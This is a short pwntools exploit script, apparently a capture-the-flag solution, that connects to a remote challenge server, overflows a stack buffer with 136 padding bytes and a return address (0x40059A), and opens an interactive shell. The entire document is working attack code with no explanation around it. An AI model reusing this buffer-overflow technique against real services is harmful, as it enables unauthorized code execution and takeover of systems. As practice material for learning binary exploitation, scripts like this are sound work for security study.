from pwn import *
sh=remote("node4.buuoj.cn",29504)
#sh=process("./timu")
payload=136*b'a'+p64(0x000000000040059A)
sh.send(payload)
sh.interactive()
